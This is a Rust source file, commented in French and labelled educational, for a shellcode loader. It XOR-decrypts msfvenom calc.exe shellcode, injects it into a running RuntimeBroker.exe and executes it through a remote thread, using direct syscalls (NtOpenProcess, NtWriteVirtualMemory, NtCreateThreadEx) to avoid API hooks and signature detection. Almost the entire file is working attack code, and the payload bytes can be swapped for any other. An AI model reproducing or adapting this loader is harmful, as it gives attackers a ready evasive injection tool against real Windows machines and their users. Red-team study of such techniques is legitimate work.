/*
    ============================================================
    🦀 CALC LOADER v4 - Process Injection into RuntimeBroker.exe
    ============================================================

    Ce loader démontre les concepts suivants:
    1. 100% Direct/Indirect Syscalls (aucun appel kernel32/ntdll via IAT)
    2. Process Injection dans RuntimeBroker.exe (process existant)
    3. XOR encryption du shellcode (anti-signature)
    4. Protection mémoire RW→RX (pas de RWX!)
    5. Droits minimum (0x002A, pas PROCESS_ALL_ACCESS!)

    Flow v4:
    1. Énumération des processes pour trouver RuntimeBroker.exe
    2. NtOpenProcess avec droits minimum
    3. NtAllocateVirtualMemory (remote, RW)
    4. NtWriteVirtualMemory (full syscall!)
    5. NtProtectVirtualMemory (RW→RX)
    6. NtCreateThreadEx (remote thread)
    7. NtClose pour cleanup

    ⚠️  USAGE ÉDUCATIF UNIQUEMENT

    Auteur: Educational Purpose
*/

use rust_syscalls::syscall;
use std::mem::zeroed;
use std::ptr::null_mut;
use winapi::ctypes::c_void;
use winapi::shared::ntdef::{HANDLE, NTSTATUS, NULL, OBJECT_ATTRIBUTES};
use winapi::shared::ntstatus::STATUS_SUCCESS;
use winapi::um::handleapi::CloseHandle;
use winapi::um::tlhelp32::*;

// ============================================================
// CONSTANTES MÉMOIRE
// ============================================================
const PAGE_READWRITE: u32 = 0x04;
const PAGE_EXECUTE_READ: u32 = 0x20;
const MEM_COMMIT_RESERVE: u32 = 0x3000;

// ============================================================
// DROITS PROCESSUS - MINIMUM REQUIS (pas PROCESS_ALL_ACCESS!)
// ============================================================
const PROCESS_CREATE_THREAD: u32 = 0x0002;
const PROCESS_VM_OPERATION: u32 = 0x0008;
const PROCESS_VM_WRITE: u32 = 0x0020;
const MINIMUM_ACCESS: u32 = PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_WRITE; // 0x002A

// ============================================================
// CONFIGURATION XOR
// ============================================================
const XOR_KEY: [u8; 4] = [0xDE, 0xAD, 0xBE, 0xEF];

/// Shellcode CHIFFRÉ pour lancer calc.exe (Windows x64)
/// Original: msfvenom -p windows/x64/exec CMD=calc.exe -f rust
/// Puis XORé avec la clé [0xDE, 0xAD, 0xBE, 0xEF]
const ENCRYPTED_SHELLCODE: [u8; 276] = [
    0x22, 0xe5, 0x3d, 0x0b, 0x2e, 0x45, 0x7e, 0xef, 0xde, 0xad, 0xff, 0xbe, 0x9f, 0xfd, 0xec, 0xbe,
    0x88, 0xe5, 0x8f, 0x3d, 0xbb, 0xe5, 0x35, 0xbd, 0xbe, 0xe5, 0x35, 0xbd, 0xc6, 0xe5, 0x35, 0xbd,
    0xfe, 0xe5, 0x35, 0x9d, 0x8e, 0xe5, 0xb1, 0x58, 0x94, 0xe7, 0xf3, 0xde, 0x17, 0xe5, 0x8f, 0x2f,
    0x72, 0x91, 0xdf, 0x93, 0xdc, 0x81, 0x9e, 0xae, 0x1f, 0x64, 0xb3, 0xae, 0xdf, 0x6c, 0x5c, 0x02,
    0x8c, 0xec, 0xef, 0xa7, 0x55, 0xff, 0x9e, 0x64, 0x9c, 0x91, 0xf6, 0xee, 0x0e, 0x26, 0x3e, 0x67,
    0xde, 0xad, 0xbe, 0xa7, 0x5b, 0x6d, 0xca, 0x88, 0x96, 0xac, 0x6e, 0xbf, 0x55, 0xe5, 0xa6, 0xab,
    0x55, 0xed, 0x9e, 0xa6, 0xdf, 0x7d, 0x5d, 0xb9, 0x96, 0x52, 0x77, 0xae, 0x55, 0x99, 0x36, 0xa7,
    0xdf, 0x7b, 0xf3, 0xde, 0x17, 0xe5, 0x8f, 0x2f, 0x72, 0xec, 0x7f, 0x26, 0xd3, 0xec, 0xbf, 0x2e,
    0xe6, 0x4d, 0xcb, 0x1e, 0x92, 0xae, 0xf2, 0xcb, 0xd6, 0xe8, 0x87, 0x3e, 0xab, 0x75, 0xe6, 0xab,
    0x55, 0xed, 0x9a, 0xa6, 0xdf, 0x7d, 0xd8, 0xae, 0x55, 0xa1, 0xf6, 0xab, 0x55, 0xed, 0xa2, 0xa6,
    0xdf, 0x7d, 0xff, 0x64, 0xda, 0x25, 0xf6, 0xee, 0x0e, 0xec, 0xe6, 0xae, 0x86, 0xf3, 0xe7, 0xb5,
    0x9f, 0xf5, 0xff, 0xb6, 0x9f, 0xf7, 0xf6, 0x6c, 0x32, 0x8d, 0xff, 0xbd, 0x21, 0x4d, 0xe6, 0xae,
    0x87, 0xf7, 0xf6, 0x64, 0xcc, 0x44, 0xe9, 0x10, 0x21, 0x52, 0xe3, 0xa7, 0x64, 0xac, 0xbe, 0xef,
    0xde, 0xad, 0xbe, 0xef, 0xde, 0xe5, 0x33, 0x62, 0xdf, 0xac, 0xbe, 0xef, 0x9f, 0x17, 0x8f, 0x64,
    0xb1, 0x2a, 0x41, 0x3a, 0x65, 0x5d, 0x0b, 0x4d, 0x88, 0xec, 0x04, 0x49, 0x4b, 0x10, 0x23, 0x10,
    0x0b, 0xe5, 0x3d, 0x2b, 0xf6, 0x91, 0xb8, 0x93, 0xd4, 0x2d, 0x45, 0x0f, 0xab, 0xa8, 0x05, 0xa8,
    0xcd, 0xdf, 0xd1, 0x85, 0xde, 0xf4, 0xff, 0x66, 0x04, 0x52, 0x6b, 0x8c, 0xbf, 0xc1, 0xdd, 0xc1,
    0xbb, 0xd5, 0xdb, 0xef,
];

// ============================================================
// STRUCTURES POUR NtOpenProcess
// ============================================================
#[repr(C)]
struct ClientId {
    unique_process: HANDLE,
    unique_thread: HANDLE,
}

// ============================================================
// FONCTION XOR
// ============================================================
fn xor_decrypt(encrypted: &[u8], key: &[u8]) -> Vec<u8> {
    encrypted
        .iter()
        .enumerate()
        .map(|(i, byte)| byte ^ key[i % key.len()])
        .collect()
}

/// Trouve le PID d'un processus par son nom
fn find_process_pid(target_name: &str) -> Option<u32> {
    unsafe {
        let snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if snapshot == winapi::um::handleapi::INVALID_HANDLE_VALUE {
            return None;
        }

        let mut entry: PROCESSENTRY32W = zeroed();
        entry.dwSize = std::mem::size_of::<PROCESSENTRY32W>() as u32;

        if Process32FirstW(snapshot, &mut entry) != 0 {
            loop {
                // Convertir le nom du process en String
                let name = String::from_utf16_lossy(&entry.szExeFile)
                    .trim_end_matches('\0')
                    .to_lowercase();

                if name == target_name.to_lowercase() {
                    let pid = entry.th32ProcessID;
                    CloseHandle(snapshot);
                    return Some(pid);
                }

                if Process32NextW(snapshot, &mut entry) == 0 {
                    break;
                }
            }
        }

        CloseHandle(snapshot);
        None
    }
}

/// Injecte le shellcode dans le processus cible (100% syscalls!)
fn inject_shellcode(target_pid: u32, encrypted_shellcode: &[u8]) -> Result<(), String> {
    println!("[*] Target PID: {}", target_pid);

    // =====================================================
    // ÉTAPE 1: Déchiffrer le shellcode
    // =====================================================
    println!("\n[STEP 1] XOR Decryption");
    println!("────────────────────────────────────────────");

    let shellcode = xor_decrypt(encrypted_shellcode, &XOR_KEY);

    println!(
        "[+] Decrypted! First 4 bytes: {:02X} {:02X} {:02X} {:02X}",
        shellcode[0], shellcode[1], shellcode[2], shellcode[3]
    );
    println!("[+] Expected:                 FC 48 83 E4");

    unsafe {
        // =====================================================
        // ÉTAPE 2: NtOpenProcess (droits minimum 0x002A!)
        // =====================================================
        println!(
            "\n[STEP 2] NtOpenProcess (minimum rights: 0x{:04X})",
            MINIMUM_ACCESS
        );
        println!("────────────────────────────────────────────");

        let mut h_process: HANDLE = null_mut();
        let mut obj_attr: OBJECT_ATTRIBUTES = zeroed();
        obj_attr.Length = std::mem::size_of::<OBJECT_ATTRIBUTES>() as u32;

        let mut client_id = ClientId {
            unique_process: target_pid as HANDLE,
            unique_thread: null_mut(),
        };

        let status: NTSTATUS = syscall!(
            "NtOpenProcess",
            &mut h_process as *mut HANDLE,
            MINIMUM_ACCESS,
            &mut obj_attr as *mut OBJECT_ATTRIBUTES,
            &mut client_id as *mut ClientId
        );

        if status != STATUS_SUCCESS {
            return Err(format!("NtOpenProcess failed: {:#X}", status));
        }

        println!("[+] Process handle: {:p}", h_process);

        // =====================================================
        // ÉTAPE 3: NtAllocateVirtualMemory (remote, RW)
        // =====================================================
        println!("\n[STEP 3] NtAllocateVirtualMemory (remote, RW)");
        println!("────────────────────────────────────────────");

        let mut base_address: *mut c_void = null_mut();
        let mut region_size: usize = shellcode.len();

        let status: NTSTATUS = syscall!(
            "NtAllocateVirtualMemory",
            h_process,
            &mut base_address as *mut _ as *mut _,
            0usize,
            &mut region_size as *mut usize,
            MEM_COMMIT_RESERVE,
            PAGE_READWRITE
        );

        if status != STATUS_SUCCESS {
            let _: NTSTATUS = syscall!("NtClose", h_process);
            return Err(format!("NtAllocateVirtualMemory failed: {:#X}", status));
        }

        println!("[+] Remote memory at: {:p}", base_address);

        // =====================================================
        // ÉTAPE 4: NtWriteVirtualMemory (FULL SYSCALL!)
        // =====================================================
        println!("\n[STEP 4] NtWriteVirtualMemory (full syscall!)");
        println!("────────────────────────────────────────────");

        let mut bytes_written: usize = 0;

        let status: NTSTATUS = syscall!(
            "NtWriteVirtualMemory",
            h_process,
            base_address,
            shellcode.as_ptr() as *const c_void,
            shellcode.len(),
            &mut bytes_written as *mut usize
        );

        if status != STATUS_SUCCESS {
            let _: NTSTATUS = syscall!("NtClose", h_process);
            return Err(format!("NtWriteVirtualMemory failed: {:#X}", status));
        }

        println!("[+] Written {} bytes to remote process", bytes_written);

        // =====================================================
        // ÉTAPE 5: NtProtectVirtualMemory (RW → RX)
        // =====================================================
        println!("\n[STEP 5] NtProtectVirtualMemory (RW → RX)");
        println!("────────────────────────────────────────────");

        let mut old_protect: u32 = 0;
        let mut protect_addr = base_address;
        let mut protect_size = shellcode.len();

        let status: NTSTATUS = syscall!(
            "NtProtectVirtualMemory",
            h_process,
            &mut protect_addr as *mut _ as *mut _,
            &mut protect_size as *mut usize,
            PAGE_EXECUTE_READ,
            &mut old_protect as *mut u32
        );

        if status != STATUS_SUCCESS {
            let _: NTSTATUS = syscall!("NtClose", h_process);
            return Err(format!("NtProtectVirtualMemory failed: {:#X}", status));
        }

        println!(
            "[+] Protection: 0x{:02X} → 0x{:02X}",
            old_protect, PAGE_EXECUTE_READ
        );

        // =====================================================
        // ÉTAPE 6: NtCreateThreadEx (remote thread)
        // =====================================================
        println!("\n[STEP 6] NtCreateThreadEx (remote thread)");
        println!("────────────────────────────────────────────");

        let mut thread_handle: *mut c_void = null_mut();

        let status: NTSTATUS = syscall!(
            "NtCreateThreadEx",
            &mut thread_handle as *mut _ as *mut _,
            0x1FFFFFu32,
            NULL,
            h_process,
            base_address,
            NULL,
            0u32,
            0usize,
            0usize,
            0usize,
            NULL
        );

        if status != STATUS_SUCCESS {
            let _: NTSTATUS = syscall!("NtClose", h_process);
            return Err(format!("NtCreateThreadEx failed: {:#X}", status));
        }

        println!("[+] Remote thread created: {:p}", thread_handle);
        println!("[+] Shellcode executing in RuntimeBroker.exe!");

        // =====================================================
        // ÉTAPE 7: NtClose (cleanup avec syscalls!)
        // =====================================================
        println!("\n[STEP 7] NtClose (cleanup)");
        println!("────────────────────────────────────────────");

        let _: NTSTATUS = syscall!("NtClose", thread_handle);
        let _: NTSTATUS = syscall!("NtClose", h_process);

        println!("[+] Handles closed");

        Ok(())
    }
}

fn main() {
    println!(
        r#"
    ╔═══════════════════════════════════════════════════════════╗
    ║  🦀 CALC LOADER v4 - RuntimeBroker.exe Injection Edition 🦀    ║
    ║                                                           ║
    ║  Techniques:                                              ║
    ║  ✓ Process injection into existing RuntimeBroker.exe           ║
    ║  ✓ Full syscalls (NtWriteVirtualMemory, NtClose)         ║
    ║  ✓ Minimum rights (0x002A, not PROCESS_ALL_ACCESS!)      ║
    ║  ✓ XOR encrypted shellcode                               ║
    ║  ✓ RW → RX memory protection                             ║
    ║                                                           ║
    ║  Syscalls used:                                           ║
    ║  • NtOpenProcess        • NtProtectVirtualMemory         ║
    ║  • NtAllocateVirtualMemory  • NtCreateThreadEx           ║
    ║  • NtWriteVirtualMemory     • NtClose                    ║
    ║                                                           ║
    ║  ⚠️  FOR EDUCATIONAL PURPOSES ONLY                        ║
    ╚═══════════════════════════════════════════════════════════╝
    "#
    );

    // Étape 1: Trouver RuntimeBroker.exe
    println!("[*] Searching for RuntimeBroker.exe...");

    let pid = match find_process_pid("RuntimeBroker.exe") {
        Some(pid) => pid,
        None => {
            eprintln!("[✗] RuntimeBroker.exe not found!");
            eprintln!("[*] Tip: Open a folder with thumbnails to spawn RuntimeBroker.exe");
            std::process::exit(1);
        }
    };

    println!("[+] Found RuntimeBroker.exe with PID: {}", pid);

    // Étape 2: Injecter le shellcode
    match inject_shellcode(pid, &ENCRYPTED_SHELLCODE) {
        Ok(_) => {
            println!("\n════════════════════════════════════════════");
            println!("[✓] SUCCESS: Calc launched from RuntimeBroker.exe!");
            println!("════════════════════════════════════════════");
        }
        Err(e) => {
            eprintln!("\n[✗] ERROR: {}", e);
            std::process::exit(1);
        }
    }
}
